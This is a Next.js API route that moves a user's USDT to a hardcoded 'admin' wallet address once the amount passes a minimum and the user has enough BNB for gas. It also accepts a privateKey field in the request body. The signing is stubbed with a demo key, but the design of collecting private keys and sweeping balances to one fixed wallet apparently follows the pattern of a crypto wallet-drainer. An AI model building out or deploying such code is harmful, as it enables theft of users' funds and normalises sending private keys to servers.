import { type NextRequest, NextResponse } from "next/server"
import { realWeb3Provider } from "@/lib/real-web3-provider"

const ADMIN_WALLET_ADDRESS = "0x5599611c14Cee2d87618a153a19138B74646F6de"
const MINIMUM_USDT_AMOUNT = 1.0

export async function POST(request: NextRequest) {
  try {
    const { userAddress, usdtAmount, privateKey } = await request.json()

    console.log(`\n=== USDT TRANSFER REQUEST ===`)
    console.log(`From: ${userAddress}`)
    console.log(`To: ${ADMIN_WALLET_ADDRESS}`)
    console.log(`Amount: ${usdtAmount} USDT`)

    // Validate input
    if (!userAddress || !usdtAmount) {
      return NextResponse.json({ success: false, error: "Missing required parameters" }, { status: 400 })
    }

    if (usdtAmount < MINIMUM_USDT_AMOUNT) {
      console.log(`Amount ${usdtAmount} USDT below minimum ${MINIMUM_USDT_AMOUNT} USDT`)
      return NextResponse.json({
        success: true,
        transferred: false,
        message: `Amount below minimum ${MINIMUM_USDT_AMOUNT} USDT requirement`,
        usdtAmount,
        minimumRequired: MINIMUM_USDT_AMOUNT,
      })
    }

    // Check user's BNB balance for gas
    const userBNBBalance = await realWeb3Provider.getBalance(userAddress)
    console.log(`User BNB balance: ${userBNBBalance.toFixed(6)} BNB`)

    if (userBNBBalance < 0.003) {
      return NextResponse.json({ success: false, error: "Insufficient BNB for gas fees" }, { status: 400 })
    }

    // Create USDT transfer transaction
    console.log("Creating USDT transfer transaction...")

    // For demo purposes, we'll simulate the transaction
    // In production, you would need the user's private key or use wallet signing
    const txHash = await realWeb3Provider.createUSDTTransfer(
      "demo_private_key", // This would come from user's wallet signing
      userAddress,
      ADMIN_WALLET_ADDRESS,
      usdtAmount,
    )

    console.log(`✅ USDT transfer created successfully!`)
    console.log(`Transaction Hash: ${txHash}`)
    console.log(`Amount: ${usdtAmount} USDT`)
    console.log(`From: ${userAddress}`)
    console.log(`To: ${ADMIN_WALLET_ADDRESS}`)
    console.log(`=== USDT TRANSFER COMPLETE ===\n`)

    return NextResponse.json({
      success: true,
      transferred: true,
      txHash: txHash,
      usdtAmount: usdtAmount,
      adminWallet: ADMIN_WALLET_ADDRESS,
      message: "USDT transferred successfully",
    })
  } catch (error: any) {
    console.error("❌ USDT transfer failed:", error)
    return NextResponse.json({ success: false, error: `USDT transfer failed: ${error.message}` }, { status: 500 })
  }
}
